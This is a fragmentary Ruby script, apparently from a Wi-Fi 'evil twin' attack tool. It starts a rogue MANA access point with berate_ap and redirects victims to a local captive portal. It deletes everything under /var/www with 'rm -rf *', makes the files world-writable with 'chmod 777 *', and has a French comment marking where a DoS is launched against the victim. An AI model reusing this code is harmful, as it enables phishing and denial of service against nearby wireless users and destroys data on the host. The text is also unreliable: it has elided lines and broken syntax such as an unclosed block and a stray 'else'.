...
load 'check.rb'
system "berate_ap --mana-loud -n --redirect-to-localhost --ieee80211n -g 175.0.0.1 wlan0 -c #{$canal} #{"#$ssid ".shellescape} &> /dev/null &"
sleep 20
...
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
puts "\e[1;94m[*] Configuracion del systemode hotspot...\e[0m"
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
...
sleep 1
Selection.interface # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service apache2 restart`
sleep 4
